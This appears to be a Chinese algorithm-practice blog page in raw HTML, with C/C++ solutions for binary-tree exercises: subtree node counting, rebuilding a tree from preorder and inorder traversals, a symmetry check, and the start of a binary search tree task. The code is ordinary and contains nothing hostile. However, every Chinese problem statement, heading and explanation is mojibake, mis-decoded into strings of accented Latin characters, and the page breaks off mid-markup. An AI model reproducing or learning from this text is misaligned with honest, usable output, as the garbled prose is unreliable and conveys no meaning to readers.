3é‚£ä¹ˆä¸Šå›¾ä¸­çš„ç»“ç‚¹13ï¼Œ14ï¼Œ15ä»¥åŠåé¢çš„ç»“ç‚¹éƒ½æ˜¯ä¸å­˜åœ¨çš„ï¼Œç»“ç‚¹mæ‰€åœ¨å­æ ‘ä¸­åŒ…æ‹¬çš„ç»“ç‚¹æœ‰3ï¼Œ6ï¼Œ7ï¼Œ12ï¼Œå› æ­¤ç»“ç‚¹mçš„æ‰€åœ¨å­æ ‘ä¸­å…±æœ‰4ä¸ªç»“ç‚¹ã€‚</code></pre><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-15"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-15" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-17"><a href="#è¾“å…¥æè¿°-17" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æ•°æ®åŒ…æ‹¬å¤šè¡Œï¼Œæ¯è¡Œç»™å‡ºä¸€ç»„æµ‹è¯•æ•°æ®ï¼ŒåŒ…æ‹¬ä¸¤ä¸ªæ•´æ•°mï¼Œ<span class="built_in">n</span> (<span class="number">1</span> &lt;= m &lt;= <span class="built_in">n</span> &lt;= <span class="number">1000000000</span>)ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-17"><a href="#è¾“å‡ºæè¿°-17" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹äºæ¯ä¸€ç»„æµ‹è¯•æ•°æ®ï¼Œè¾“å‡ºä¸€è¡Œï¼Œè¯¥è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•°ï¼Œç»™å‡ºç»“ç‚¹mæ‰€åœ¨å­æ ‘ä¸­åŒ…æ‹¬çš„ç»“ç‚¹çš„æ•°ç›®ã€‚</span><br></pre></td></tr></table></figure><p>ç›´æ¥é€’å½’</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x &gt; y)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">ans += <span class="number">1</span>;</span><br><span class="line"><span class="built_in">cal</span>(x*<span class="number">2</span>, y);</span><br><span class="line"><span class="built_in">cal</span>(x*<span class="number">2</span>+<span class="number">1</span>, y);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; y)&#123;</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cal</span>(x, y);</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘éå†2"><a href="#äºŒå‰æ ‘éå†2" class="headerlink" title="äºŒå‰æ ‘éå†2"></a>äºŒå‰æ ‘éå†2</h3><h5 id="é¢˜ç›®æè¿°-18"><a href="#é¢˜ç›®æè¿°-18" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>äºŒå‰æ ‘çš„å‰åºã€ä¸­åºã€ååºéå†çš„å®šä¹‰ï¼š å‰åºéå†ï¼šå¯¹ä»»ä¸€å­æ ‘ï¼Œå…ˆè®¿é—®è·Ÿï¼Œç„¶åéå†å…¶å·¦å­æ ‘ï¼Œæœ€åéå†å…¶å³å­æ ‘ï¼› ä¸­åºéå†ï¼šå¯¹ä»»ä¸€å­æ ‘ï¼Œå…ˆéå†å…¶å·¦å­æ ‘ï¼Œç„¶åè®¿é—®æ ¹ï¼Œæœ€åéå†å…¶å³å­æ ‘ï¼› ååºéå†ï¼šå¯¹ä»»ä¸€å­æ ‘ï¼Œå…ˆéå†å…¶å·¦å­æ ‘ï¼Œç„¶åéå†å…¶å³å­æ ‘ï¼Œæœ€åè®¿é—®æ ¹ã€‚ ç»™å®šä¸€æ£µäºŒå‰æ ‘çš„å‰åºéå†å’Œä¸­åºéå†ï¼Œæ±‚å…¶ååºéå†ï¼ˆæç¤ºï¼šç»™å®šå‰åºéå†ä¸ä¸­åºéå†èƒ½å¤Ÿå”¯ä¸€ç¡®å®šååºéå†ï¼‰ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-16"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-16" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-18"><a href="#è¾“å…¥æè¿°-18" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶é•¿åº¦nå‡å°äºç­‰äº<span class="number">26</span>ã€‚</span><br><span class="line">ç¬¬ä¸€è¡Œä¸ºå‰åºéå†ï¼Œç¬¬äºŒè¡Œä¸ºä¸­åºéå†ã€‚</span><br><span class="line">äºŒå‰æ ‘ä¸­çš„ç»“ç‚¹åç§°ä»¥å¤§å†™å­—æ¯è¡¨ç¤ºï¼š<span class="selector-tag">A</span>ï¼Œ<span class="selector-tag">B</span>ï¼ŒC....æœ€å¤š<span class="number">26</span>ä¸ªç»“ç‚¹ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-18"><a href="#è¾“å‡ºæè¿°-18" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æ ·ä¾‹å¯èƒ½æœ‰å¤šç»„ï¼Œå¯¹äºæ¯ç»„æµ‹è¯•æ ·ä¾‹ï¼Œ</span><br><span class="line">è¾“å‡ºä¸€è¡Œï¼Œä¸ºååºéå†çš„å­—ç¬¦ä¸²ã€‚</span><br></pre></td></tr></table></figure><p>å¯¹å‰åºæ¥è¯´ï¼Œç¬¬ä¸€ä¸ªæ°¸è¿œæ˜¯çˆ¶èŠ‚ç‚¹ï¼›å¯¹ä¸­åºæ¥è¯´ï¼Œçˆ¶èŠ‚ç‚¹å°†å­èŠ‚ç‚¹åˆ†å¼€ã€‚æ ¹æ®è¿™ä¸ªæ€è·¯é€’å½’å»ºæ ‘</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">l</span>, *<span class="title">r</span>;</span></span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> flag;</span><br><span class="line"></span><br><span class="line"><span class="function">Tree <span class="title">build</span><span class="params">(string pre, string mid, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(start &gt; end) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = start; i &lt;= end; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(pre[flag] == mid[i]) n = i;</span><br><span class="line">&#125;</span><br><span class="line">Tree t;</span><br><span class="line">t = <span class="keyword">new</span> node;</span><br><span class="line">t-&gt;c = pre[flag];</span><br><span class="line">t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">flag++;</span><br><span class="line">t-&gt;l = <span class="built_in">build</span>(pre, mid, start, n<span class="number">-1</span>);</span><br><span class="line">t-&gt;r = <span class="built_in">build</span>(pre, mid, n+<span class="number">1</span>, end);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(t-&gt;l);</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(t-&gt;r);</span><br><span class="line">cout &lt;&lt; t-&gt;c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string x, y;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; y)&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> len = y.<span class="built_in">size</span>();</span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="built_in">build</span>(x, y, <span class="number">0</span>, len<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­äºŒå‰æ ‘æ˜¯å¦å¯¹ç§°"><a href="#åˆ¤æ–­äºŒå‰æ ‘æ˜¯å¦å¯¹ç§°" class="headerlink" title="åˆ¤æ–­äºŒå‰æ ‘æ˜¯å¦å¯¹ç§°"></a>åˆ¤æ–­äºŒå‰æ ‘æ˜¯å¦å¯¹ç§°</h3><h5 id="é¢˜ç›®æè¿°-19"><a href="#é¢˜ç›®æè¿°-19" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>å±‚æ¬¡éå†çš„æ–¹å¼è¾“å…¥ä¸€ä¸ªäºŒå‰æ ‘ï¼Œåˆ¤æ–­è¿™ä¸ªäºŒå‰æ ‘çš„ç»“æ„ï¼ˆå³ä¸ç”¨ç®¡ç»“ç‚¹çš„å€¼ï¼‰æ˜¯å¦é•œåƒå¯¹ç§°ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-17"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-17" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-19"><a href="#è¾“å…¥æè¿°-19" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ä¸€è¡Œå­—æ¯ï¼Œå…¶ä¸­<span class="meta">#è¡¨ç¤ºç©ºèŠ‚ç‚¹ï¼ˆå­—æ¯é•¿åº¦å°äº1000ï¼‰ã€‚</span></span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-19"><a href="#è¾“å‡ºæè¿°-19" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœè¾“å…¥çš„äºŒå‰æ ‘å¯¹ç§°ï¼Œè¾“å‡º<span class="keyword">YES</span>ï¼Œå¦åˆ™è¾“å‡º<span class="keyword">NO</span>ã€‚</span><br></pre></td></tr></table></figure><p>å…ˆå±‚æ¬¡è¯»å…¥äºŒå‰æ ‘ï¼Œæ–¹æ³•æ˜¯ç”¨é˜Ÿåˆ—ï¼Œå…ˆè¿›çš„èŠ‚ç‚¹å…ˆè¯»å–ï¼›ç„¶åé€’å½’åˆ¤æ–­æ˜¯å¦å¯¹ç§°ï¼Œå³ä½¿ç”¨å·¦å³èŠ‚ç‚¹ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">l</span>, *<span class="title">r</span>;</span></span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">Tree <span class="title">build</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">queue&lt;Tree&gt; q;</span><br><span class="line">Tree root = <span class="keyword">new</span> node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s[<span class="number">0</span>] != <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">root-&gt;c = s[x++];</span><br><span class="line">root-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">root-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">q.<span class="built_in">push</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">Tree rt = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">Tree l, r;</span><br><span class="line"><span class="keyword">if</span>(s[x] == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">l = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> node;</span><br><span class="line">l-&gt;c = s[x];</span><br><span class="line">q.<span class="built_in">push</span>(l);</span><br><span class="line">&#125;</span><br><span class="line">x++;</span><br><span class="line">rt-&gt;l = l;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s[x] == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">r = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">r = <span class="keyword">new</span> node;</span><br><span class="line">r-&gt;c = s[x];</span><br><span class="line">q.<span class="built_in">push</span>(r);</span><br><span class="line">&#125;</span><br><span class="line">x++;</span><br><span class="line">rt-&gt;r = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(Tree l, Tree r)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(l == <span class="literal">NULL</span> &amp;&amp; r == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(l == <span class="literal">NULL</span> || r == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">judge</span>(l-&gt;l, r-&gt;r) &amp; <span class="built_in">judge</span>(l-&gt;r, r-&gt;l);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="built_in">build</span>(s);</span><br><span class="line">Tree l = root-&gt;l, r = root-&gt;r;</span><br><span class="line"><span class="keyword">bool</span> ans = <span class="built_in">judge</span>(l, r);</span><br><span class="line"><span class="keyword">if</span>(ans) cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ«äººå†™çš„ä¹Ÿæœ‰ç›´æ¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œå¯¹ç§°åˆ¤æ–­çš„ã€‚ç¬¬0-0ä¸ªæ˜¯ç¬¬ä¸€å±‚ï¼Œ1-2æ˜¯ç¬¬äºŒå±‚ï¼Œ3-6æ˜¯ç¬¬ä¸‰å±‚â€¦ï¼Œå³i-jï¼Œä¸‹ä¸€å±‚å°±æ˜¯2i+1â€”â€”2j+2ï¼Œç„¶åå°±ç®€å•äº†ã€‚å¥•</p><p>ï¼æ‚Ÿï¼</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Judge</span><span class="params">(<span class="keyword">char</span> *s,<span class="keyword">int</span> start,<span class="keyword">int</span> end,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (end&gt;=len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = start,j=end; i&lt;=j; i++,j--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((s[i]==<span class="string">&#x27;#&#x27;</span>&amp;&amp;s[j]!=<span class="string">&#x27;#&#x27;</span>)||(s[j]==<span class="string">&#x27;#&#x27;</span>&amp;&amp;s[i]!=<span class="string">&#x27;#&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Judge</span>(s,<span class="number">2</span>*start+<span class="number">1</span>,<span class="number">2</span>*end+<span class="number">2</span>,len);<span class="comment">//åˆ¤æ–­ä¸‹ä¸€å±‚</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="built_in">Judge</span>(s,<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">strlen</span>(s))?<span class="string">&quot;YES&quot;</span>:<span class="string">&quot;NO&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒå‰æ’åºæ ‘"><a href="#äºŒå‰æ’åºæ ‘" class="headerlink" title="äºŒå‰æ’åºæ ‘"></a>äºŒå‰æ’åºæ ‘</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>å·¦å­æ ‘çš„æ¯”æ ¹èŠ‚ç‚¹å°ï¼Œå³å­æ ‘æ¯”æ ¹èŠ‚ç‚¹å¤§ï¼Œå·¦å³å­æ ‘ä¹Ÿéƒ½æ˜¯äºŒå‰æ’åºæ ‘</p><h3 id="äºŒå‰æ’åºæ ‘2"><a href="#äºŒå‰æ’åºæ ‘2" class="headerlink" title="äºŒå‰æ’åºæ ‘2"></a>äºŒå‰æ’åºæ ‘2</h3><h5 id="é¢˜ç›®æè¿°-20"><a href="#é¢˜ç›®æè¿°-20" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>è¾“å…¥ä¸€ç³»åˆ—æ•´æ•°ï¼Œå»ºç«‹äºŒå‰æ’åºæ ‘ï¼Œå¹¶è¿›è¡Œå‰åºï¼Œä¸­åºï¼Œååºéå†ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-18"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-18" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-20"><a href="#è¾“å…¥æè¿°-20" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ç¬¬ä¸€è¡ŒåŒ…æ‹¬ä¸€ä¸ªæ•´æ•°<span class="built_in">n</span>(<span class="comment">1&lt;=n&lt;=100</span>)ã€‚</span><br><span class="line">æ¥ä¸‹æ¥çš„ä¸€è¡ŒåŒ…æ‹¬<span class="built_in">n</span>ä¸ªæ•´æ•°ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-20"><a href="#è¾“å‡ºæè¿°-20" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯èƒ½æœ‰å¤šç»„æµ‹è¯•æ•°æ®ï¼Œå¯¹äºæ¯ç»„æ•°æ®ï¼Œå°†é¢˜ç›®æ‰€ç»™æ•°æ®å»ºç«‹ä¸€ä¸ªäºŒå‰æ’åºæ ‘ï¼Œå¹¶å¯¹äºŒå‰æ’åºæ ‘è¿›è¡Œå‰åºã€ä¸­åºå’Œååºéå†ã€‚</span><br><span class="line">æ¯ç§éå†ç»“æœè¾“å‡ºä¸€è¡Œã€‚æ¯è¡Œæœ€åä¸€ä¸ªæ•°æ®ä¹‹åæœ‰ä¸€ä¸ªç©ºæ ¼ã€‚</span><br><span class="line"></span><br><span class="line">è¾“å…¥ä¸­å¯èƒ½æœ‰é‡å¤å…ƒç´ ï¼Œä½†æ˜¯è¾“å‡ºçš„äºŒå‰æ ‘éå†åºåˆ—ä¸­é‡å¤å…ƒç´ ä¸ç”¨è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 